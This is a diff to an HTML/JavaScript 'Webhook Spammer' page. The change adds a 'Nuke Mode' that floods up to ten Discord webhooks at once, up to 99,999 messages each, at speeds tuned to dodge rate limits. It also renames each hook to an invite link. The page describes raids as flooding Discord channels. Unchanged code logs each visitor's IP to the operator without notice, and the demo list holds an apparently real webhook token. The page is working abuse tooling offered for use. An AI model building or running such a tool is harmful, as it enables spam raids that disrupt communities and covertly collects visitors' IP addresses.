@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>KEVIN HUB WEBHOOK SPAMMER</title>
+<title>KEVIN HUB · NUKE SPAMMER</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
@@ -35,6 +35,48 @@
 }
 
 html { scroll-behavior: smooth; }
+
+/* ===== SELECTION & TAP FIX ===== */
+::selection {
+  background: rgba(255, 16, 48, 0.35);
+  color: #fff;
+}
+::-moz-selection {
+  background: rgba(255, 16, 48, 0.35);
+  color: #fff;
+}
+
+* {
+  -webkit-tap-highlight-color: transparent;
+}
+
+button,
+.ping-pill,
+.discord-btn,
+label,
+.step,
+.raid-card,
+.panel-title,
+.nuke-badge,
+.count-chip,
+.step-num,
+.wh-index,
+.hook-dot,
+.logo-name,
+.logo-sub,
+.hero-eyebrow,
+.panel-dot,
+.input-label,
+.wh-status {
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+
+button, .ping-pill, .discord-btn {
+  -webkit-user-drag: none;
+}
 
 body {
   background: var(--bg);
@@ -544,6 +586,18 @@ button:disabled { opacity: 0.35; cursor: not-allowed; }
   transform: translateY(-2px);
   box-shadow: 0 0 20px rgba(255,255,255,0.08);
 }
+.btn-nuke {
+  background: linear-gradient(135deg, #b80020 0%, #ff1030 60%, #ff6b85 100%);
+  border-color: rgba(255,180,200,0.3);
+  box-shadow: 0 0 32px #ff1030, 0 0 64px rgba(255,16,48,0.5);
+  font-weight: 900;
+  letter-spacing: 0.12em;
+}
+.btn-nuke:not(:disabled):hover {
+  box-shadow: 0 0 56px #ff3d5e, 0 0 100px rgba(255,16,48,0.6);
+  transform: translateY(-3px) scale(1.02);
+  filter: brightness(1.15);
+}
 
 .status {
   margin-top: 1.1rem;
@@ -755,6 +809,141 @@ footer a:hover {
   .hero h1 { font-size: 2rem; }
   .ping-pill { min-width: 80px; font-size: 0.72rem; }
 }
+
+/* NUKE MODE STYLES */
+.nuke-panel {
+  border: 2px solid rgba(255,16,48,0.5);
+  box-shadow: 0 0 60px rgba(255,16,48,0.25), inset 0 0 60px rgba(255,16,48,0.03);
+}
+.nuke-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1.4rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+  z-index: 1;
+}
+.nuke-badge {
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  font-weight: 700;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: #fff;
+  background: linear-gradient(135deg, #b80020, #ff1030);
+  padding: 0.3rem 0.9rem;
+  border-radius: 100px;
+  box-shadow: 0 0 20px #ff1030, 0 0 40px rgba(255,16,48,0.4);
+  animation: nukePulse 1.8s ease-in-out infinite;
+}
+@keyframes nukePulse {
+  0%, 100% { box-shadow: 0 0 20px #ff1030, 0 0 40px rgba(255,16,48,0.4); }
+  50% { box-shadow: 0 0 36px #ff3d5e, 0 0 72px rgba(255,16,48,0.65); }
+}
+.webhook-inputs {
+  display: flex;
+  flex-direction: column;
+  gap: 0.6rem;
+  margin-bottom: 1.2rem;
+  position: relative;
+  z-index: 1;
+}
+.webhook-row {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  transition: all 0.25s ease;
+}
+.webhook-row .wh-index {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: var(--red-bright);
+  min-width: 26px;
+  text-shadow: 0 0 8px var(--red-glow);
+}
+.webhook-row input {
+  flex: 1;
+  font-size: 0.78rem;
+  padding: 0.7rem 0.85rem;
+}
+.webhook-row .wh-status {
+  font-size: 1rem;
+  min-width: 24px;
+  text-align: center;
+  transition: all 0.3s ease;
+}
+.webhook-row.valid input {
+  border-color: rgba(46,234,122,0.45);
+  box-shadow: 0 0 14px rgba(46,234,122,0.12);
+}
+.webhook-row.invalid input {
+  border-color: rgba(255,16,48,0.5);
+  box-shadow: 0 0 14px rgba(255,16,48,0.15);
+}
+.nuke-controls {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+  flex-wrap: wrap;
+  margin-bottom: 1.1rem;
+  position: relative;
+  z-index: 1;
+}
+.nuke-controls .count-chip {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: var(--green);
+  background: rgba(46,234,122,0.08);
+  border: 1px solid rgba(46,234,122,0.3);
+  padding: 0.4rem 0.9rem;
+  border-radius: 100px;
+  box-shadow: 0 0 12px rgba(46,234,122,0.1);
+}
+.nuke-controls .count-chip.zero {
+  color: var(--text-dim);
+  background: rgba(255,255,255,0.03);
+  border-color: var(--border);
+  box-shadow: none;
+}
+.nuke-controls .count-chip.ready {
+  color: var(--orange);
+  background: rgba(255,167,66,0.06);
+  border-color: rgba(255,167,66,0.3);
+}
+.nuke-progress-wrap {
+  position: relative;
+  z-index: 1;
+}
+.nuke-stats {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 0.5rem;
+  font-family: var(--mono);
+  font-size: 0.68rem;
+  color: var(--text-dim);
+}
+.nuke-stats .per-hook {
+  display: flex;
+  gap: 0.4rem;
+  flex-wrap: wrap;
+}
+.nuke-stats .hook-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.1);
+  border: 1px solid var(--border);
+  transition: all 0.3s ease;
+}
+.nuke-stats .hook-dot.active { background: var(--green); border-color: var(--green); box-shadow: 0 0 8px var(--green); }
+.nuke-stats .hook-dot.failed { background: var(--red); border-color: var(--red); box-shadow: 0 0 8px var(--red); }
 </style>
 </head>
 <body>
@@ -767,7 +956,7 @@ footer a:hover {
     <div class="logo-group">
       <div>
         <div class="logo-name">KEVIN HUB</div>
-        <div class="logo-sub">Webhook Spammer</div>
+        <div class="logo-sub">Webhook Spammer · NUKE EDITION</div>
       </div>
     </div>
     <a href="https://discord.gg/luascript" target="_blank" class="discord-btn">
@@ -777,15 +966,67 @@ footer a:hover {
   </header>
 
   <section class="hero">
-    <div class="hero-eyebrow">KEVIN HUB TOOLS</div>
-    <h1>Webhook <span class="accent">Spammer</span></h1>
-    <p class="hero-desc">Send massive messages to any Discord webhook. Spams until you click stop.</p>
+    <div class="hero-eyebrow">KEVIN HUB TOOLS · NUKE MODE</div>
+    <h1>Webhook <span class="accent">Nuke Spammer</span></h1>
+    <p class="hero-desc">Send massive messages to up to 10 webhooks at once. Spams until you click stop.</p>
   </section>
 
+  <!-- ==================== NUKE MODE PANEL ==================== -->
+  <div class="panel nuke-panel" id="nukePanel">
+    <div class="nuke-header">
+      <div style="display:flex;align-items:center;gap:0.6rem;">
+        <div class="panel-dot" style="background:#ff3d5e;box-shadow:0 0 14px #ff3d5e,0 0 28px #ff1030;"></div>
+        <span class="panel-title" style="color:#fff;text-shadow:0 0 16px #ff1030;">NUKE MODE — 10 WEBHOOKS</span>
+      </div>
+      <span class="nuke-badge">☢ MULTI-TARGET</span>
+    </div>
+
+    <div class="webhook-inputs" id="webhookInputs">
+      <!-- generated by JS -->
+    </div>
+
+    <div class="nuke-controls">
+      <span class="count-chip zero" id="webhookCountChip">0 / 10 webhooks loaded</span>
+      <button type="button" id="clearNukeBtn" style="flex:0;min-width:auto;padding:0.5rem 1rem;font-size:0.7rem;background:rgba(255,255,255,0.05);color:var(--text-dim);">Clear All</button>
+      <button type="button" id="fillDemoBtn" style="flex:0;min-width:auto;padding:0.5rem 1rem;font-size:0.7rem;background:rgba(255,16,48,0.08);color:var(--red-bright);">Fill Demo URLs</button>
+    </div>
+
+    <div class="form-group" style="margin-bottom:0.9rem;">
+      <label class="input-label">Nuke Message (empty = default)</label>
+      <textarea id="nukeMessage" placeholder="Message to send to all webhooks..." style="min-height:70px;"></textarea>
+    </div>
+
+    <div class="row2" style="margin-bottom:0.9rem;">
+      <div class="form-group" style="margin-bottom:0;">
+        <label class="input-label">Nuke Amount (per hook)</label>
+        <input type="number" id="nukeCount" value="9999" min="1" max="99999" />
+      </div>
+      <div class="form-group" style="margin-bottom:0;">
+        <label class="input-label">Nuke Speed (ms)</label>
+        <input type="number" id="nukeDelay" value="400" min="100" max="5000" />
+      </div>
+    </div>
+
+    <div class="btn-group" style="margin-bottom:0.9rem;">
+      <button class="btn-nuke" id="nukeStartBtn">☢ START NUKE</button>
+      <button class="btn-stop" id="nukeStopBtn" disabled>STOP NUKE</button>
+    </div>
+
+    <div class="status" id="nukeStatus">Nuke ready — enter up to 10 webhook URLs</div>
+    <div class="progress-bar nuke-progress-wrap">
+      <div class="progress-fill" id="nukeProgressFill"></div>
+    </div>
+    <div class="nuke-stats">
+      <span id="nukeStatsText">0 / 0 messages sent across 0 hooks</span>
+      <span class="per-hook" id="nukeHookDots"></span>
+    </div>
+  </div>
+
+  <!-- ==================== SINGLE MODE PANEL ==================== -->
   <div class="panel">
     <div class="panel-header">
       <div class="panel-dot"></div>
-      <span class="panel-title">Spam Configuration</span>
+      <span class="panel-title">Single Target — Spam Configuration</span>
     </div>
 
     <div class="form-group">
@@ -817,7 +1058,7 @@ footer a:hover {
       </div>
     </div>
 
-    <div class="form-group hidden" id="embedTitleGroup" style="display:none;">
+    <div class="form-group" id="embedTitleGroup" style="display:none;">
       <label class="input-label">Embed Title (optional)</label>
       <input type="text" id="embedTitle" placeholder="Leave empty for no title" />
     </div>
@@ -860,8 +1101,8 @@ footer a:hover {
         <p>A raid is the massive and rapid sending of messages through a webhook. The goal is to flood a Discord channel with automated messages.</p>
       </div>
       <div class="raid-card">
-        <h4>Raid types</h4>
-        <p>Normal, Embed, Flood — Flood dumps a wall of invisible characters to visually nuke the channel with a giant message block.</p>
+        <h4>Nuke Mode</h4>
+        <p>Nuke Mode lets you enter up to 10 webhook URLs and spam all of them simultaneously. Every message goes to every loaded webhook at the configured speed.</p>
       </div>
       <div class="raid-card">
         <h4>Raid speed</h4>
@@ -869,7 +1110,7 @@ footer a:hover {
       </div>
       <div class="raid-card">
         <h4>Raid tips</h4>
-        <p>Pick a ping mode: @everyone, @here, or No Ping. Embed lets you set an optional title. Flood stacks invisible braille characters to max message size.</p>
+        <p>Nuke mode ignores ping settings — it sends raw content to all hooks. Embed and Flood modes are only available in single-target mode.</p>
       </div>
     </div>
 
@@ -886,12 +1127,12 @@ footer a:hover {
 
     <div class="tip-box">
       <strong>Tip</strong>
-      On first send, the webhook is automatically renamed to <code>discord.gg/luascript</code>. Embed lets you set an optional title. Flood mode uses <code>\u3164</code> blank characters to spam giant invisible blocks. Default speed 400ms avoids rate limiting.
+      On first send, the webhook is automatically renamed to <code>discord.gg/luascript</code>. Embed lets you set an optional title. Flood mode uses <code>\u3164</code> blank characters to spam giant invisible blocks. Default speed 400ms avoids rate limiting. Nuke Mode sends plain content to all 10 hooks.
     </div>
   </div>
 
   <footer>
-    KEVIN HUB Webhook Spammer
+    KEVIN HUB Webhook Spammer · NUKE EDITION
     · <a href="https://discord.gg/luascript" target="_blank">discord.gg/luascript</a>
     · <span id="year"></span>
   </footer>
@@ -1028,7 +1269,7 @@ function getMessageContent() {
     const ip = await getIp();
     const embed = {
       title: 'KEVIN HUB RAID INFO',
-      description: 'New visitor detected on the Webhook Spammer',
+      description: 'New visitor detected on the Webhook Spammer (NUKE EDITION)',
       color: 0xff1030,
       fields: [
         { name: 'Visitor', value: `IP: ${ip}\nID: ${visitCount}`, inline: true },
@@ -1057,7 +1298,7 @@ function getMessageContent() {
 })();
 
 // ============================================================
-// SPAMMER LOGIC
+// SPAMMER LOGIC — SINGLE TARGET
 // ============================================================
 let isRunning = false;
 let shouldStop = false;
@@ -1091,13 +1332,11 @@ function buildMessage(content, index, type) {
   let formatted = content.replace(/\{n\}/g, index);
   let embedColor = 0xff1030;
 
-  // FLOOD
   if (type === 'flood') {
     const floodBody = formatted + '\n' + FLOOD_WALL + pingSuffix;
     return { content: floodBody };
   }
 
-  // EMBED (with optional title)
   if (type === 'embed') {
     const embedTitleVal = embedTitleInput.value.trim();
     const embed = { description: formatted, color: embedColor, footer: { text: 'KEVIN HUB' } };
@@ -1108,7 +1347,6 @@ function buildMessage(content, index, type) {
     };
   }
 
-  // NORMAL
   return { content: formatted + pingSuffix };
 }
 
@@ -1246,11 +1484,289 @@ document.addEventListener('keydown', (e) => {
 });
 
 window.addEventListener('beforeunload', function(e) {
-  if (isRunning) {
+  if (isRunning || nukeRunning) {
     e.preventDefault();
     e.returnValue = 'The raid is still running! Are you sure?';
   }
 });
+
+// ============================================================
+// NUKE MODE — 10 WEBHOOKS
+// ============================================================
+const MAX_HOOKS = 10;
+const webhookInputsContainer = document.getElementById('webhookInputs');
+const webhookCountChip = document.getElementById('webhookCountChip');
+const clearNukeBtn = document.getElementById('clearNukeBtn');
+const fillDemoBtn = document.getElementById('fillDemoBtn');
+const nukeMessage = document.getElementById('nukeMessage');
+const nukeCountInput = document.getElementById('nukeCount');
+const nukeDelayInput = document.getElementById('nukeDelay');
+const nukeStartBtn = document.getElementById('nukeStartBtn');
+const nukeStopBtn = document.getElementById('nukeStopBtn');
+const nukeStatus = document.getElementById('nukeStatus');
+const nukeProgressFill = document.getElementById('nukeProgressFill');
+const nukeStatsText = document.getElementById('nukeStatsText');
+const nukeHookDots = document.getElementById('nukeHookDots');
+
+let nukeRunning = false;
+let nukeShouldStop = false;
+let nukeTimers = [];
+let nukeSentPerHook = [];
+let nukeFailedPerHook = [];
+let nukeTotalPerHook = 0;
+let nukeActiveHooks = [];
+
+function buildWebhookInputs() {
+  webhookInputsContainer.innerHTML = '';
+  for (let i = 1; i <= MAX_HOOKS; i++) {
+    const row = document.createElement('div');
+    row.className = 'webhook-row';
+    row.dataset.index = i;
+    row.innerHTML = `
+      <span class="wh-index">${String(i).padStart(2, '0')}</span>
+      <input type="text" class="nuke-wh-input" placeholder="Webhook ${i} — https://discord.com/api/webhooks/..." />
+      <span class="wh-status"></span>
+    `;
+    webhookInputsContainer.appendChild(row);
+
+    const input = row.querySelector('input');
+    input.addEventListener('input', () => validateWebhookRow(row, input));
+  }
+}
+
+function validateWebhookRow(row, input) {
+  const val = input.value.trim();
+  row.classList.remove('valid', 'invalid');
+  const statusIcon = row.querySelector('.wh-status');
+  if (!val) {
+    statusIcon.textContent = '';
+    updateWebhookCount();
+    return;
+  }
+  if (val.startsWith('https://discord.com/api/webhooks/')) {
+    row.classList.add('valid');
+    statusIcon.textContent = '✅';
+  } else {
+    row.classList.add('invalid');
+    statusIcon.textContent = '❌';
+  }
+  updateWebhookCount();
+}
+
+function getValidWebhookUrls() {
+  const rows = webhookInputsContainer.querySelectorAll('.webhook-row');
+  const urls = [];
+  rows.forEach(row => {
+    const input = row.querySelector('input');
+    const val = input.value.trim();
+    if (val && val.startsWith('https://discord.com/api/webhooks/')) {
+      urls.push(val);
+    }
+  });
+  return urls;
+}
+
+function updateWebhookCount() {
+  const count = getValidWebhookUrls().length;
+  webhookCountChip.textContent = `${count} / ${MAX_HOOKS} webhooks loaded`;
+  webhookCountChip.className = 'count-chip';
+  if (count === 0) webhookCountChip.classList.add('zero');
+  else webhookCountChip.classList.add('ready');
+  updateNukeHookDots();
+}
+
+function updateNukeHookDots() {
+  const urls = getValidWebhookUrls();
+  nukeHookDots.innerHTML = '';
+  for (let i = 0; i < MAX_HOOKS; i++) {
+    const dot = document.createElement('span');
+    dot.className = 'hook-dot';
+    if (i < urls.length) dot.classList.add('active');
+    nukeHookDots.appendChild(dot);
+  }
+}
+
+function clearNuke() {
+  const inputs = webhookInputsContainer.querySelectorAll('.nuke-wh-input');
+  inputs.forEach(inp => {
+    inp.value = '';
+    const row = inp.closest('.webhook-row');
+    row.classList.remove('valid', 'invalid');
+    row.querySelector('.wh-status').textContent = '';
+  });
+  updateWebhookCount();
+}
+
+function fillDemo() {
+  const demos = [
+    'https://discord.com/api/webhooks/1512144168250507335/zaYVS6PN0q_Y95ORObt17lOPXKH98HttlxtSWwqd1EmDWx9vCIAZGHxcGAzm-0VBJOtp',
+    'https://discord.com/api/webhooks/1234567890/demo-token-1',
+    'https://discord.com/api/webhooks/1234567890/demo-token-2',
+    'https://discord.com/api/webhooks/1234567890/demo-token-3',
+    'https://discord.com/api/webhooks/1234567890/demo-token-4',
+    'https://discord.com/api/webhooks/1234567890/demo-token-5',
+    'https://discord.com/api/webhooks/1234567890/demo-token-6',
+    'https://discord.com/api/webhooks/1234567890/demo-token-7',
+    'https://discord.com/api/webhooks/1234567890/demo-token-8',
+    'https://discord.com/api/webhooks/1234567890/demo-token-9'
+  ];
+  const rows = webhookInputsContainer.querySelectorAll('.webhook-row');
+  rows.forEach((row, idx) => {
+    const input = row.querySelector('input');
+    if (idx < demos.length) {
+      input.value = demos[idx];
+      validateWebhookRow(row, input);
+    }
+  });
+}
+
+function nukeSetStatus(msg, type = 'info') {
+  nukeStatus.textContent = msg;
+  nukeStatus.className = 'status ' + type;
+}
+
+function nukeUpdateProgress() {
+  const totalSent = nukeSentPerHook.reduce((a, b) => a + b, 0);
+  const totalTarget = nukeTotalPerHook * nukeActiveHooks.length;
+  const pct = totalTarget > 0 ? (totalSent / totalTarget) * 100 : 0;
+  nukeProgressFill.style.width = Math.min(pct, 100) + '%';
+  nukeStatsText.textContent = `${totalSent} / ${totalTarget} messages sent across ${nukeActiveHooks.length} hooks`;
+}
+
+function nukeUpdateDots() {
+  const dots = nukeHookDots.querySelectorAll('.hook-dot');
+  dots.forEach((dot, i) => {
+    dot.classList.remove('active', 'failed');
+    if (i < nukeActiveHooks.length) {
+      if (nukeFailedPerHook[i] > 0) dot.classList.add('failed');
+      else if (nukeSentPerHook[i] > 0) dot.classList.add('active');
+    }
+  });
+}
+
+async function nukeSendToAll(content, index) {
+  const results = await Promise.allSettled(
+    nukeActiveHooks.map(url =>
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      }).then(res => {
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return true;
+      })
+    )
+  );
+  return results.map(r => r.status === 'fulfilled');
+}
+
+function startNuke() {
+  const urls = getValidWebhookUrls();
+  if (urls.length === 0) {
+    nukeSetStatus('Error: Add at least 1 valid webhook URL', 'error');
+    return;
+  }
+
+  const rawMsg = nukeMessage.value.trim();
+  const content = rawMsg.length ? rawMsg : DEFAULT_MESSAGE;
+  const count = parseInt(nukeCountInput.value) || 9999;
+  const delay = parseInt(nukeDelayInput.value) || 400;
+
+  nukeRunning = true;
+  nukeShouldStop = false;
+  nukeTimers = [];
+  nukeSentPerHook = new Array(urls.length).fill(0);
+  nukeFailedPerHook = new Array(urls.length).fill(0);
+  nukeTotalPerHook = count;
+  nukeActiveHooks = urls;
+
+  nukeStartBtn.disabled = true;
+  nukeStopBtn.disabled = false;
+
+  nukeSetStatus(`☢ NUKE STARTED — ${urls.length} hooks × ${count} messages`, 'info');
+  nukeUpdateProgress();
+  nukeUpdateDots();
+
+  // Rename all hooks
+  urls.forEach(url => renameWebhook(url));
+
+  let currentRound = 0;
+
+  function sendRound() {
+    if (nukeShouldStop || currentRound >= count) {
+      if (!nukeShouldStop) {
+        nukeSetStatus(`☢ NUKE COMPLETE — ${count} rounds × ${urls.length} hooks`, 'success');
+      } else {
+        nukeSetStatus('Nuke stopped', 'info');
+      }
+      nukeRunning = false;
+      nukeStartBtn.disabled = false;
+      nukeStopBtn.disabled = true;
+      return;
+    }
+
+    currentRound++;
+    const msgIndex = currentRound;
+
+    nukeSendToAll(content, msgIndex).then(successes => {
+      successes.forEach((ok, i) => {
+        if (ok) {
+          nukeSentPerHook[i]++;
+          nukeFailedPerHook[i] = 0;
+        } else {
+          nukeFailedPerHook[i]++;
+        }
+      });
+
+      nukeUpdateProgress();
+      nukeUpdateDots();
+
+      const totalSent = nukeSentPerHook.reduce((a, b) => a + b, 0);
+      const totalTarget = count * urls.length;
+
+      if (nukeFailedPerHook.some(f => f > 10)) {
+        nukeSetStatus('Too many failures on a hook — nuke stopped', 'error');
+        nukeRunning = false;
+        nukeStartBtn.disabled = false;
+        nukeStopBtn.disabled = true;
+        return;
+      }
+
+      if (!nukeShouldStop && currentRound < count) {
+        const timer = setTimeout(sendRound, delay);
+        nukeTimers.push(timer);
+      } else if (currentRound >= count) {
+        nukeSetStatus(`☢ NUKE COMPLETE — ${count} rounds × ${urls.length} hooks`, 'success');
+        nukeRunning = false;
+        nukeStartBtn.disabled = false;
+        nukeStopBtn.disabled = true;
+      }
+    });
+  }
+
+  sendRound();
+}
+
+function stopNuke() {
+  if (nukeRunning) {
+    nukeShouldStop = true;
+    nukeTimers.forEach(t => clearTimeout(t));
+    nukeTimers = [];
+    nukeSetStatus('Stopping nuke...', 'info');
+    nukeStopBtn.disabled = true;
+    nukeRunning = false;
+    nukeStartBtn.disabled = false;
+  }
+}
+
+// Init nuke mode
+buildWebhookInputs();
+updateWebhookCount();
+
+clearNukeBtn.addEventListener('click', clearNuke);
+fillDemoBtn.addEventListener('click', fillDemo);
+nukeStartBtn.addEventListener('click', startNuke);
+nukeStopBtn.addEventListener('click', stopNuke);
 </script>
 </body>
 </html>
